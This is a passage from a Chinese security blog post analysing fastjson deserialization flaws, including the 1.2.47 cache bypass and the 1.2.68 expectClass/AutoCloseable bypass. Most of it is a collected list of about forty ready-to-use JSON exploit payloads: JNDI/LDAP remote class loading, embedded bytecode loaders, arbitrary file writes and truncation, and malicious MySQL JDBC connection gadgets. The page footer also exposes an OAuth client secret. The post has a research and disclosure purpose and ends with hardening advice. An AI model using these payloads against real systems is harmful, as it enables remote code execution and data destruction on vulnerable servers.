+<ul>
+<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache)</code>：调用链均在 <code>checkAutoType()</code> 和 <code>TypeUtils</code> 里自调用，略过。</li>
+<li><code>Class&lt;?&gt; loadClass(String className)</code>：除了自调用，有一个 <code>castToJavaBean()</code> 方法，暂未研究。</li>
+<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code>：方法调用三个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中，</li>
+</ul>
+<p>重点看一下两个参数的 <code>loadClass</code> 方法在哪调用：</p>
+<figure data-type="image" tabindex="17"><img src="https://su18.org/post-images/1616546295578.png" alt="" loading="lazy"></figure>
+<p>在这里我们关注 <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> 方法，这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 <code>Class.class</code> 类，成为了我们的入口。</p>
+<figure data-type="image" tabindex="18"><img src="https://su18.org/post-images/1616548832213.png" alt="" loading="lazy"></figure>
+<p>如果 <code>parser.resolveStatus</code> 为<code>TypeNameRedirect</code> 时，进入 if 语句，会解析 “val” 中的内容放入 objVal 中，然后传入 strVal 中。</p>
+<figure data-type="image" tabindex="19"><img src="https://su18.org/post-images/1616549216642.png" alt="" loading="lazy"></figure>
+<p>后面的逻辑如果 class 是 <code>Class.class</code> 时，将会调用 <code>loadClass</code> 方法，将 strVal 进行类加载并缓存：</p>
+<figure data-type="image" tabindex="20"><img src="https://su18.org/post-images/1616548937936.png" alt="" loading="lazy"></figure>
+<p>这就完成了恶意类的加载，组成了我们所有的恶意调用链。但是如何在第二步进入 if 语句呢？这中间的调用链是什么样的呢？我们先构造一个 json ：<code>{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;aaaaa&quot;}</code> ，调试一下：</p>
+<p><code>JSON.parseObject()</code> 调用 <code>DefaultJSONParser</code> 对 JSON 进行解析。</p>
+<figure data-type="image" tabindex="21"><img src="https://su18.org/post-images/1616551479274.png" alt="" loading="lazy"></figure>
+<p><code>DefaultJSONParser.parseObject()</code> 调用 <code>checkAutoType()</code> 检查待加载类的合法性。</p>
+<figure data-type="image" tabindex="22"><img src="https://su18.org/post-images/1616551465173.png" alt="" loading="lazy"></figure>
+<p>由于 deserializers 在初始化时将  <code>Class.class</code> 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。</p>
+<figure data-type="image" tabindex="23"><img src="https://su18.org/post-images/1616551453453.png" alt="" loading="lazy"></figure>
+<p><code>DefaultJSONParser.parseObject()</code> 设置 resolveStatus 为 TypeNameRedirect。</p>
+<figure data-type="image" tabindex="24"><img src="https://su18.org/post-images/1616551442803.png" alt="" loading="lazy"></figure>
+<p><code>DefaultJSONParser.parseObject()</code> 根据不同的 class 类型分配 deserialzer，Class 类型由 <code>MiscCodec.deserialze()</code> 处理。</p>
+<figure data-type="image" tabindex="25"><img src="https://su18.org/post-images/1616551434486.png" alt="" loading="lazy"></figure>
+<p>解析 json 中 “val” 中的内容，并放入 objVal 中，如果不是 &quot;val&quot; 将会报错。</p>
+<figure data-type="image" tabindex="26"><img src="https://su18.org/post-images/1616551427835.png" alt="" loading="lazy"></figure>
+<p>传递至 strVal 并使用 <code>loadClass</code> 加载并缓存。</p>
+<figure data-type="image" tabindex="27"><img src="https://su18.org/post-images/1616551420168.png" alt="" loading="lazy"></figure>
+<p>此时恶意的 val 成功被我们加载到 mappings 中，再次以恶意类进行 <code>@type</code> 请求时即可绕过黑名单进行的阻拦，因此最终 payload 为：</p>
+<pre><code class="language-json">{
+	&quot;su18&quot;: {
+		&quot;@type&quot;: &quot;java.lang.Class&quot;,
+		&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+	},
+	&quot;su19&quot;: {
+		&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+		&quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+		&quot;autoCommit&quot;: true
+	}
+}
+</code></pre>
+<h2 id="8-fastjson-1268">8. fastjson-1.2.68</h2>
+<p>在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p>
+<p>这个安全修复为 fastjson 带来了一定时间的平静，直到 1.2.68 版本出现了新的漏洞利用方式。</p>
+<blockquote>
+<p>影响版本：<code>fastjson &lt;= 1.2.68</code><br>
+描述：利用 expectClass 绕过 <code>checkAutoType()</code> ，实际上也是为了绕过安全检查的思路的延伸。主要使用 <code>Throwable</code> 和 <code>AutoCloseable</code> 进行绕过。</p>
+</blockquote>
+<p>版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 <code>checkAutoType()</code> 中直接抛出异常，也就是完全禁止 autoType，不得不说，这是一个一劳永逸的修复方式。</p>
+<figure data-type="image" tabindex="28"><img src="https://su18.org/post-images/1616569998850.png" alt="" loading="lazy"></figure>
+<p>但与此同时，这个版本报出了一个新的 autoType 开关绕过方式：利用 expectClass 绕过  <code>checkAutoType()</code>。</p>
+<p>在 <code>checkAutoType()</code> 函数中有这样的逻辑：如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code> 的安全检测。</p>
+<figure data-type="image" tabindex="29"><img src="https://su18.org/post-images/1616575145371.png" alt="" loading="lazy"></figure>
+<p>接下来我们找一下 <code>checkAutoType()</code> 几个重载方法是否有可控的 <code>expectClass</code> 的入参方式，最终找到了以下几个类：</p>
+<ul>
+<li><code>ThrowableDeserializer#deserialze()</code></li>
+<li><code>JavaBeanDeserializer#deserialze()</code></li>
+</ul>
+<p><code>ThrowableDeserializer#deserialze()</code> 方法直接将 <code>@type</code> 后的类传入 <code>checkAutoType()</code> ，并且 expectClass 为 <code>Throwable.class</code>。</p>
+<figure data-type="image" tabindex="30"><img src="https://su18.org/post-images/1616590581075.png" alt="" loading="lazy"></figure>
+<p>通过 <code>checkAutoType()</code> 之后，将使用 <code>createException</code> 来创建异常类的实例。</p>
+<figure data-type="image" tabindex="31"><img src="https://su18.org/post-images/1616591945228.png" alt="" loading="lazy"></figure>
+<p>这就形成了 <code>Throwable</code> 子类绕过 <code>checkAutoType()</code> 的方式。我们需要找到 <code>Throwable</code> 的子类，这个类的 getter/setter/static block/constructor 中含有具有威胁的代码逻辑。</p>
+<p>与 <code>Throwable</code> 类似地，还有 <code>AutoCloseable</code> ，之所以使用 <code>AutoCloseable</code> 以及其子类可以绕过 <code>checkAutoType()</code> ，是因为 <code>AutoCloseable</code> 是属于 fastjson 内置的白名单中，其余的调用链一致，流程不再赘述。</p>
+<h1 id="四-payload">四、payload</h1>
+<p>以下为部分在各个途径搜集的 payload，版本自测：</p>
+<p>JdbcRowSetImpl</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+    &quot;autoCommit&quot;: true
+}
+</code></pre>
+<p>TemplatesImpl</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
+	&quot;_bytecodes&quot;: [&quot;yv66vgA...k=&quot;],
+	'_name': 'su18',
+	'_tfactory': {},
+	&quot;_outputProperties&quot;: {},
+}
+</code></pre>
+<p>JndiDataSourceFactory</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
+    &quot;properties&quot;: {
+      &quot;data_source&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+    }
+}
+</code></pre>
+<p>SimpleJndiBeanFactory</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,
+    &quot;targetBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+    &quot;propertyPath&quot;: &quot;su18&quot;,
+    &quot;beanFactory&quot;: {
+      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,
+      &quot;shareableResources&quot;: [
+        &quot;ldap://127.0.0.1:23457/Command8&quot;
+      ]
+    }
+}
+</code></pre>
+<p>DefaultBeanFactoryPointcutAdvisor</p>
+<pre><code class="language-json">{
+  &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,
+   &quot;beanFactory&quot;: {
+     &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,
+     &quot;shareableResources&quot;: [
+       &quot;ldap://127.0.0.1:23457/Command8&quot;
+     ]
+   },
+   &quot;adviceBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+},
+{
+   &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;
+}
+</code></pre>
+<p>WrapperConnectionPoolDataSource</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,
+    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced000...6f;&quot;
+  }
+</code></pre>
+<p>JndiRefForwardingDataSource</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,
+    &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+    &quot;loginTimeout&quot;: 0
+  }
+</code></pre>
+<p>InetAddress</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.net.InetAddress&quot;,
+	&quot;val&quot;: &quot;http://dnslog.com&quot;
+}
+</code></pre>
+<p>Inet6Address</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.net.Inet6Address&quot;,
+	&quot;val&quot;: &quot;http://dnslog.com&quot;
+}
+</code></pre>
+<p>URL</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.net.URL&quot;,
+	&quot;val&quot;: &quot;http://dnslog.com&quot;
+}
+</code></pre>
+<p>JSONObject</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,
+	{
+		&quot;@type&quot;: &quot;java.net.URL&quot;,
+		&quot;val&quot;: &quot;http://dnslog.com&quot;
+	}
+}
+&quot;&quot;
+}
+</code></pre>
+<p>URLReader</p>
+<pre><code class="language-json">{
+	&quot;poc&quot;: {
+		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+		&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONReader&quot;,
+		&quot;reader&quot;: {
+			&quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,
+			&quot;url&quot;: &quot;http://127.0.0.1:9999&quot;
+		}
+	}
+}
+</code></pre>
+<p>AutoCloseable 任意文件写入</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+	&quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;,
+	&quot;out&quot;: {
+		&quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,
+		&quot;file&quot;: &quot;/path/to/target&quot;
+	},
+	&quot;parameters&quot;: {
+		&quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;,
+		&quot;filename&quot;: &quot;filecontent&quot;
+	}
+}
+</code></pre>
+<p>BasicDataSource</p>
+<pre><code class="language-json">{
+  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,
+  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;,
+  &quot;driverClassLoader&quot; :
+  {
+    &quot;@type&quot;:&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;
+  }
+}
+</code></pre>
+<p>JndiConverter</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,
+	&quot;AsText&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>JtaTransactionConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,
+	&quot;properties&quot;: {
+		&quot;@type&quot;: &quot;java.util.Properties&quot;,
+		&quot;UserTransaction&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+	}
+}
+</code></pre>
+<p>JndiObjectFactory</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,
+	&quot;resourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>AnterosDBCPConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,
+	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>AnterosDBCPConfig2</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,
+	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>CacheJndiTmLookup</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,
+	&quot;jndiNames&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>AutoCloseable 清空指定文件</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+    &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,
+    &quot;file&quot;:&quot;/tmp/nonexist&quot;,
+    &quot;append&quot;:false
+}
+</code></pre>
+<p>AutoCloseable 清空指定文件</p>
+<pre><code class="language-json">{
+    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+    &quot;@type&quot;:&quot;java.io.FileWriter&quot;,
+    &quot;file&quot;:&quot;/tmp/nonexist&quot;,
+    &quot;append&quot;:false
+}
+</code></pre>
+<p>AutoCloseable 任意文件写入</p>
+<pre><code class="language-json">{
+    &quot;stream&quot;:
+    {
+        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,
+        &quot;file&quot;:&quot;/tmp/nonexist&quot;,
+        &quot;append&quot;:false
+    },
+    &quot;writer&quot;:
+    {
+        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;:&quot;org.apache.solr.common.util.FastOutputStream&quot;,
+        &quot;tempBuffer&quot;:&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;,
+        &quot;sink&quot;:
+        {
+            &quot;$ref&quot;:&quot;$.stream&quot;
+        },
+        &quot;start&quot;:38
+    },
+    &quot;close&quot;:
+    {
+        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;:&quot;org.iq80.snappy.SnappyOutputStream&quot;,
+        &quot;out&quot;:
+        {
+            &quot;$ref&quot;:&quot;$.writer&quot;
+        }
+    }
+}
+</code></pre>
+<p>AutoCloseable MarshalOutputStream 任意文件写入</p>
+<pre><code>{
+	'@type': &quot;java.lang.AutoCloseable&quot;,
+	'@type': 'sun.rmi.server.MarshalOutputStream',
+	'out': {
+		'@type': 'java.util.zip.InflaterOutputStream',
+		'out': {
+			'@type': 'java.io.FileOutputStream',
+			'file': 'dst',
+			'append': false
+		},
+		'infl': {
+			'input': {
+				'array': 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
+				'limit': 22
+			}
+		},
+		'bufLen': 1048576
+	},
+	'protocolVersion': 1
+}
+</code></pre>
+<p>BasicDataSource</p>
+<pre><code class="language-json">{
+		&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+		&quot;driverClassName&quot;: &quot;true&quot;,
+		&quot;driverClassLoader&quot;: {
+			&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+		},
+		&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot;
+	}
+</code></pre>
+<p>HikariConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;,
+	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>HikariConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;,
+	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>HikariConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,
+	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>HikariConfig</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,
+	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>SessionBeanProvider</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,
+	&quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,
+	&quot;Object&quot;: &quot;su18&quot;
+}
+</code></pre>
+<p>JMSContentInterceptor</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;,
+	&quot;parameters&quot;: {
+		&quot;@type&quot;: &quot;java.util.Hashtable&quot;,
+		&quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,
+		&quot;topic-factory&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+	},
+	&quot;namespace&quot;: &quot;&quot;
+}
+</code></pre>
+<p>ContextClassLoaderSwitcher</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;,
+	&quot;contextClassLoader&quot;: {
+		&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+	},
+	&quot;a&quot;: {
+		&quot;@type&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot;
+	}
+}
+</code></pre>
+<p>OracleManagedConnectionFactory</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,
+	&quot;xaDataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>JNDIConfiguration</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;org.apache.commons.configuration.JNDIConfiguration&quot;,
+	&quot;prefix&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
+}
+</code></pre>
+<p>JDBC4Connection</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+	&quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,
+	&quot;hostToConnectTo&quot;: &quot;172.20.64.40&quot;,
+	&quot;portToConnectTo&quot;: 3306,
+	&quot;url&quot;: &quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,
+	&quot;databaseToConnectTo&quot;: &quot;test&quot;,
+	&quot;info&quot;: {
+		&quot;@type&quot;: &quot;java.util.Properties&quot;,
+		&quot;PORT&quot;: &quot;3306&quot;,
+		&quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,
+		&quot;autoDeserialize&quot;: &quot;true&quot;,
+		&quot;user&quot;: &quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;,
+		&quot;PORT.1&quot;: &quot;3306&quot;,
+		&quot;HOST.1&quot;: &quot;172.20.64.40&quot;,
+		&quot;NUM_HOSTS&quot;: &quot;1&quot;,
+		&quot;HOST&quot;: &quot;172.20.64.40&quot;,
+		&quot;DBNAME&quot;: &quot;test&quot;
+	}
+}
+</code></pre>
+<p>LoadBalancedMySQLConnection</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+	&quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,
+	&quot;proxy&quot;: {
+		&quot;connectionString&quot;: {
+			&quot;url&quot;: &quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot;
+		}
+	}
+}
+</code></pre>
+<p>UnpooledDataSource</p>
+<pre><code class="language-json">{
+	&quot;x&quot;: {
+		{
+			&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,
+			&quot;name&quot;: {
+				&quot;@type&quot;: &quot;java.lang.Class&quot;,
+				&quot;val&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;
+			},
+			&quot;c&quot;: {
+				&quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,
+				&quot;key&quot;: {
+					&quot;@type&quot;: &quot;java.lang.Class&quot;,
+					&quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+				},
+				&quot;driverClassLoader&quot;: {
+					&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+				},
+				&quot;driver&quot;: &quot;$$BCEL$$$l$8b$...&quot;
+			}
+		}: &quot;a&quot;
+	}
+}
+</code></pre>
+<p>LoadBalancedMySQLConnection2</p>
+<pre><code>{ &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;, &quot;proxy&quot;: { &quot;connectionString&quot;:{ &quot;url&quot;:&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;useSSL=false&amp;user=yso_CommonsCollections5_calc&quot; } } }}
+</code></pre>
+<p>ReplicationMySQLConnection</p>
+<pre><code>{
+       &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,
+       &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,
+       &quot;proxy&quot;: {
+              &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,
+              &quot;connectionUrl&quot;:{
+                     &quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;,
+                     &quot;masters&quot;:[{
+                            &quot;host&quot;:&quot;&quot;
+                     }],
+                     &quot;slaves&quot;:[],
+                     &quot;properties&quot;:{
+                            &quot;host&quot;:&quot;127.0.0.1&quot;,
+                            &quot;port&quot;:&quot;3306&quot;,          
+                            &quot;user&quot;:&quot;yso_CommonsCollections4_calc&quot;,
+                            &quot;dbname&quot;:&quot;dbname&quot;,
+                            &quot;password&quot;:&quot;pass&quot;,
+                            &quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,
+                            &quot;autoDeserialize&quot;:&quot;true&quot;
+                     }
+              }
+       }
+}
+
+</code></pre>
+<h1 id="五-总结">五、总结</h1>
+<p>通过全篇对 fastjson 诸多版本漏洞的学习和研究，可以发现作者不愿舍弃很多特性，而不停的在对程序的安全检查部分进行“打补丁”一样的漏洞修复手段，这就导致了很多漏洞反反复复的修补和绕过，不仅仅是新的 gadget 被挖掘出来需要 fastjson 不断的更新黑名单，更有很多特性点还是隐藏在程序中等待发现，其实从本文来讲，很多触发点我们只研究了其中的一种，如果肯花时间寻找调用方式，肯定还会有新的发现。</p>
+<p>建议远离 fastjson，或开启 safeMode 关闭 autoTypeSupport 并配置反序列化白名单。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%B8%80-%E7%AE%80%E4%BB%8B">一、简介</a></li>
+<li><a href="#%E4%BA%8C-fastjson-%E4%BD%BF%E7%94%A8">二、fastjson 使用</a>
+<ul>
+<li><a href="#1-%E5%B0%86%E7%B1%BB%E8%BD%AC%E4%B8%BA-json">1. 将类转为 json</a></li>
+<li><a href="#2-%E5%B0%86-json-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%BA%E7%B1%BB">2. 将 json 反序列化为类</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">三、漏洞分析</a>
+<ul>
+<li><a href="#1-fastjson-1224">1. fastjson-1.2.24</a></li>
+<li><a href="#2-fastjson-1225">2. fastjson-1.2.25</a></li>
+<li><a href="#3-fastjson-1242">3. fastjson-1.2.42</a></li>
+<li><a href="#4-fastjson-1243">4. fastjson-1.2.43</a></li>
+<li><a href="#5-fastjson-1244">5. fastjson-1.2.44</a></li>
+<li><a href="#6-fastjson-1245">6. fastjson-1.2.45</a></li>
+<li><a href="#7-fastjson-1247">7. fastjson-1.2.47</a></li>
+<li><a href="#8-fastjson-1268">8. fastjson-1.2.68</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B-payload">四、payload</a></li>
+<li><a href="#%E4%BA%94-%E6%80%BB%E7%BB%93">五、总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://su18.org/post/2020-reading/">
+              <h3 class="post-title">
+                2020年读书小结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
